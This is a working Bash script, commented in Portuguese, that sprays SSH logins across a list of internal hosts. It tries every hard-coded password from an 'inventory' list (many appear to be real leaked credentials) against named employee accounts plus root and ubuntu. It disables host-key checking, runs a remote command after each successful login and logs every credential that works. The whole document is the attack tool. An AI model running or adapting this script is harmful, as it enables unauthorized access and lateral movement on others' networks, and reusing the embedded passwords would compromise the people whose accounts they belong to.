#!/usr/bin/env bash
# Varredura SSH: em cada host com :22, RODIZIO — cada utilizador tenta TODAS as senhas
# conhecidas, so depois o seguinte utilizador (maximiza reutilizacao por conta).
# CREDS_FILE (opcional) acrescenta pares user:pass exactos no fim de cada host.
# Apos a primeira senha certa para user@host, interrompe as restantes senhas desse user
# (evita linhas "falhou" confusas e ligacoes SSH inuteis).
#
# Uso:
#   bash ssh_sweep.sh
#   bash ssh_sweep.sh 192.168.80.1 10.20.20.57 10.20.20.1
#   HOSTS_FILE=./hosts_ssh.txt bash ssh_sweep.sh
#   CREDS_FILE=./meus_pares.txt bash ssh_sweep.sh 192.168.80.1
#   SSH_BIN=/usr/bin/ssh CONNECT_TIMEOUT=7 bash ssh_sweep.sh
#
# Variaveis:
#   SSH_BIN          (default: primeiro `ssh` no PATH, senao /tmp/openssh-root/usr/bin/ssh)
#   CONNECT_TIMEOUT  (default: 6)
#   SSH_REMOTE_CMD   (default: whoami)  — comando nao-interactivo apos auth
#   STOP_ON_HIT      (default: 0)       — 1 = termina o script no primeiro sucesso (qualquer host)
#   SKIP_PORT_CHECK  (default: 0)     — 1 = nao testa /dev/tcp/22 antes
#   VERBOSE          (default: 0)     — 1 = mostra ultimas linhas do ssh em falhas
#   HOSTS_FILE       ficheiro: um host por linha (# comenta)
#   CREDS_FILE       ficheiro: linhas user:pass (# comenta; : no user raro)
#   SPRAY_USERS      utilizadores extra (virgula); default nick-server (.TODO leonard).
#                    SPRAY_USERS=- nao acrescenta ninguem alem da lista base.

set -uo pipefail

CONNECT_TIMEOUT="${CONNECT_TIMEOUT:-6}"
SSH_REMOTE_CMD="${SSH_REMOTE_CMD:-whoami}"
STOP_ON_HIT="${STOP_ON_HIT:-0}"
SKIP_PORT_CHECK="${SKIP_PORT_CHECK:-0}"
VERBOSE="${VERBOSE:-0}"
LOG_FILE="${LOG_FILE:-/tmp/ssh_sweep_$(date +%Y%m%d_%H%M%S).log}"

# Opcoes comuns (muitos Ubuntu exigem keyboard-interactive em vez de "password" puro)
_ssh_client_opts() {
  printf '%s' "-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
-o PreferredAuthentications=password,keyboard-interactive \
-o PubkeyAuthentication=no -o IdentitiesOnly=yes \
-o NumberOfPasswordPrompts=1 -o ConnectTimeout=${CONNECT_TIMEOUT}"
}

_resolve_ssh_bin() {
  if [[ -n "${SSH_BIN:-}" && -x "${SSH_BIN}" ]]; then
    printf '%s' "${SSH_BIN}"
    return
  fi
  if command -v ssh >/dev/null 2>&1; then
    command -v ssh
    return
  fi
  if [[ -x "/tmp/openssh-root/usr/bin/ssh" ]]; then
    printf '%s' "/tmp/openssh-root/usr/bin/ssh"
    return
  fi
  echo "[!] Nenhum ssh executavel (defina SSH_BIN=...)" >&2
  return 1
}

SSH_BIN="$(_resolve_ssh_bin)" || exit 1

# Ordem do rodizio: payroll + contas tipicas SSH + extras (nick-server / SPRAY_USERS)
declare -a SSH_USERS=(
  "nickj"
  "leonardz"
  "anneh"
  "joaos"
  "joshuaa"
  "jonasf"
  "dmitrip"
  "root"
  "ubuntu"
)

# Todas as senhas do inventario (cada SSH_USER tenta cada uma, por host).
declare -a SSH_PASSWORDS=(
  "ZeqlcR2!4gN"
  "averylongpasswordfornohackertodiscover"
  "VSZ785-aWB15#q"
  "F147-0356agipV"
  "QW5al7oPN2-1"
  "minecraft123"
  "42W#wskb-62wA\$sc"
  "pujkFGC471-2j"
  "nick3saturno8"
  "nick1terra0"
  "nick5mercurio#8"
  "nick4netuno7"
  "nick2venus2"
  "nick4terra\$7"
  "nick2terra1"
  "nick5jupiter-7"
  "nick0mercurio!5"
  "nick3saturno9"
  "nick1jupiter*2"
  "nick4venus7"
  "nick7marte!3"
  "nick6urano2"
  "nick5saturno5"
  "nick1netuno-0"
  "nick0marte0"
  "nick9jupiter-4"
  "nick3urano\$7"
  "nick7terra!7"
  "nick4jupiter-8"
  "nick2saturno!6"
  "nick4urano*4"
  "nick6netuno7"
  "nick1netuno\$2"
  "424242"
  "crazycat"
)

declare -a CREDS_PAIRS=()

_append_spray_users() {
  local spray_raw="${SPRAY_USERS:-nick-server}"
  [[ "${spray_raw}" == "-" ]] && return 0
  local u _ifs_old spray_list seen
  _ifs_old="${IFS}"
  IFS=,
  # shellcheck disable=SC2206
  spray_list=(${spray_raw})
  IFS="${_ifs_old}"
  for u in "${spray_list[@]}"; do
    u="${u//[[:space:]]/}"
    [[ -z "${u}" ]] && continue
    seen=0
    for x in "${SSH_USERS[@]}"; do
      [[ "${x}" == "${u}" ]] && { seen=1; break; }
    done
    [[ "${seen}" -eq 1 ]] && continue
    SSH_USERS+=("${u}")
  done
}

_append_spray_users

_load_creds_file() {
  local f="${1:-}"
  [[ -z "${f}" || ! -r "${f}" ]] && return 0
  while IFS= read -r line || [[ -n "${line}" ]]; do
    [[ -z "${line}" || "${line}" =~ ^[[:space:]]*# ]] && continue
    [[ "${line}" == *:* ]] || continue
    CREDS_PAIRS+=("${line}")
  done <"${f}"
}

_collect_hosts() {
  HOSTS=()
  if [[ -n "${HOSTS_FILE:-}" && -r "${HOSTS_FILE}" ]]; then
    while IFS= read -r line || [[ -n "${line}" ]]; do
      line="${line%%#*}"
      line="${line//[[:space:]]/}"
      [[ -z "${line}" ]] && continue
      HOSTS+=("${line}")
    done <"${HOSTS_FILE}"
  fi
  for a in "$@"; do
    [[ -z "${a}" ]] && continue
    HOSTS+=("${a}")
  done
  if [[ ${#HOSTS[@]} -eq 0 ]]; then
    HOSTS=(
      "192.168.80.1"
      "192.168.80.2"
      "192.168.80.3"
      "192.168.80.4"
      "10.20.20.1"
      "10.20.20.15"
      "10.20.20.19"
      "10.20.20.57"
      "127.0.0.1"
    )
  fi
}

_port22_open() {
  local h="$1"
  [[ "${SKIP_PORT_CHECK}" == "1" ]] && return 0
  if command -v timeout >/dev/null 2>&1; then
    timeout 2 bash -c "echo >/dev/tcp/${h}/22" 2>/dev/null
  else
    bash -c "echo >/dev/tcp/${h}/22" 2>/dev/null
  fi
}

_pick_ssh_method() {
  if command -v sshpass >/dev/null 2>&1; then
    printf '%s' "sshpass"
  elif command -v expect >/dev/null 2>&1; then
    printf '%s' "expect"
  elif command -v setsid >/dev/null 2>&1; then
    printf '%s' "askpass"
  else
    printf '%s' "manual"
  fi
}

_try_pair() {
  local host="$1" user="$2" pass="$3"
  local attempt_log rc ssh_opts
  ssh_opts="$(_ssh_client_opts)"

  attempt_log="/tmp/.ssh_sweep_${host//./_}_${user}_$$_${RANDOM}.log"
  : >"${attempt_log}"

  if [[ "${SSH_METHOD}" == "manual" ]]; then
    echo "[!] ${host}: sem sshpass/expect/setsid — comando manual:" | tee -a "${LOG_FILE}"
    echo "    SSHPASS manual: ${SSH_BIN} -o ConnectTimeout=${CONNECT_TIMEOUT} ... ${user}@${host} '${SSH_REMOTE_CMD}'" | tee -a "${LOG_FILE}"
    return 1
  fi

  if ! command -v script >/dev/null 2>&1 && [[ "${SSH_METHOD}" == "sshpass" || "${SSH_METHOD}" == "expect" ]]; then
    echo "[!] Instala 'script' (util-linux) ou use metodo askpass (setsid)." | tee -a "${LOG_FILE}"
    return 1
  fi

  set +e
  if [[ "${SSH_METHOD}" == "sshpass" ]]; then
    script -q -c "SSHPASS='${pass}' sshpass -e '${SSH_BIN}' ${ssh_opts} '${user}@${host}' '${SSH_REMOTE_CMD}'" /dev/null >"${attempt_log}" 2>&1
    rc=$?
  elif [[ "${SSH_METHOD}" == "expect" ]]; then
    script -q -c "expect -c '
      set timeout $((CONNECT_TIMEOUT + 4))
      spawn ${SSH_BIN} ${ssh_opts} ${user}@${host} ${SSH_REMOTE_CMD}
      expect {
        -re \"(?i)(password|passphrase):\" { send \"${pass}\r\"; exp_continue }
        -re \"(?i)password for\" { send \"${pass}\r\"; exp_continue }
        -re \"Permission denied\" { exit 2 }
        eof
      }
    '" /dev/null >"${attempt_log}" 2>&1
    rc=$?
  else
    local askpass_script
    askpass_script="/tmp/.askpass_sweep_${host//./_}_${user}_$$_${RANDOM}.sh"
    cat >"${askpass_script}" <<EOF
#!/usr/bin/env bash
printf '%s\n' '${pass}'
EOF
    chmod 700 "${askpass_script}"
    DISPLAY="${DISPLAY:-:0}" SSH_ASKPASS="${askpass_script}" SSH_ASKPASS_REQUIRE=force \
      setsid "${SSH_BIN}" ${ssh_opts} \
        "${user}@${host}" "${SSH_REMOTE_CMD}" >"${attempt_log}" 2>&1
    rc=$?
    rm -f "${askpass_script}"
  fi

  if grep -qiE 'Permission denied|Too many authentication failures|Authentication failed' "${attempt_log}" 2>/dev/null; then
    [[ "${VERBOSE}" == "1" ]] && { echo "[v] ${user}@${host} (negado) rc=${rc}:" | tee -a "${LOG_FILE}"; tail -6 "${attempt_log}" | tee -a "${LOG_FILE}"; }
    rm -f "${attempt_log}"
    return 1
  fi
  if [[ ${rc} -eq 0 ]] && ! grep -qiE 'Permission denied|Too many authentication failures' "${attempt_log}" 2>/dev/null; then
    echo "[+] SUCESSO ${user}@${host}  (rc=0)" | tee -a "${LOG_FILE}"
    echo "--- saida ---" | tee -a "${LOG_FILE}"
    tee -a "${LOG_FILE}" <"${attempt_log}"
    echo "-------------" | tee -a "${LOG_FILE}"
    rm -f "${attempt_log}"
    return 0
  fi
  [[ "${VERBOSE}" == "1" ]] && {
    echo "[v] ${user}@${host} inconclusivo rc=${rc}:" | tee -a "${LOG_FILE}"
    tail -12 "${attempt_log}" | tee -a "${LOG_FILE}"
  }
  rm -f "${attempt_log}"
  return 1
}

main() {
  _load_creds_file "${CREDS_FILE:-}"
  _collect_hosts "$@"

  SSH_METHOD="$(_pick_ssh_method)"

  touch "${LOG_FILE}" 2>/dev/null || LOG_FILE="/dev/null"
  {
    echo "[*] ssh_sweep — $(date -uIs)"
    echo "[*] SSH_BIN=${SSH_BIN}"
    echo "[*] Metodo=${SSH_METHOD}"
    echo "[*] Hosts (${#HOSTS[@]}): ${HOSTS[*]}"
    echo "[*] Rodizio: ${#SSH_USERS[@]} users x ${#SSH_PASSWORDS[@]} senhas | CREDS_FILE: +${#CREDS_PAIRS[@]} pares (${CREDS_FILE:-nenhum})"
    echo "[*] Users: ${SSH_USERS[*]}"
    echo "[*] Log=${LOG_FILE}"
    echo ""
  } | tee -a "${LOG_FILE}"

  local host user pass ok_any
  ok_any=0
  for host in "${HOSTS[@]}"; do
    echo "[*] === Host ${host} ===" | tee -a "${LOG_FILE}"
    if ! _port22_open "${host}"; then
      echo "[.] ${host}:22 fechado ou sem resposta (skip)" | tee -a "${LOG_FILE}"
      continue
    fi
    echo "[+] ${host}:22 aberto — rodizio + creds" | tee -a "${LOG_FILE}"
    for user in "${SSH_USERS[@]}"; do
      echo "[*]   user ${user} (${#SSH_PASSWORDS[@]} senhas) ..." | tee -a "${LOG_FILE}"
      for pass in "${SSH_PASSWORDS[@]}"; do
        if _try_pair "${host}" "${user}" "${pass}"; then
          ok_any=1
          echo "[+] CREDENCIAL (rodizio): ${user}@${host}  senha=${pass}" | tee -a "${LOG_FILE}"
          [[ "${STOP_ON_HIT}" == "1" ]] && {
            echo "[*] STOP_ON_HIT=1 — a terminar." | tee -a "${LOG_FILE}"
            exit 0
          }
          break
        else
          echo "[-]     falhou ${user}@${host}" | tee -a "${LOG_FILE}"
        fi
      done
    done
    if [[ ${#CREDS_PAIRS[@]} -gt 0 ]]; then
      echo "[*]   CREDS_FILE (${#CREDS_PAIRS[@]} pares) ..." | tee -a "${LOG_FILE}"
      for pair in "${CREDS_PAIRS[@]}"; do
        user="${pair%%:*}"
        pass="${pair#*:}"
        if _try_pair "${host}" "${user}" "${pass}"; then
          ok_any=1
          echo "[+] CREDENCIAL (CREDS_FILE): ${user}@${host}  senha=${pass}" | tee -a "${LOG_FILE}"
          [[ "${STOP_ON_HIT}" == "1" ]] && {
            echo "[*] STOP_ON_HIT=1 — a terminar." | tee -a "${LOG_FILE}"
            exit 0
          }
        else
          echo "[-]     falhou ${user}@${host}" | tee -a "${LOG_FILE}"
        fi
      done
    fi
    echo "" | tee -a "${LOG_FILE}"
  done

  if [[ "${ok_any}" -eq 0 ]]; then
    echo "[-] Nenhum par funcionou nos hosts com :22 aberto." | tee -a "${LOG_FILE}"
    exit 1
  fi
  exit 0
}

main "$@"
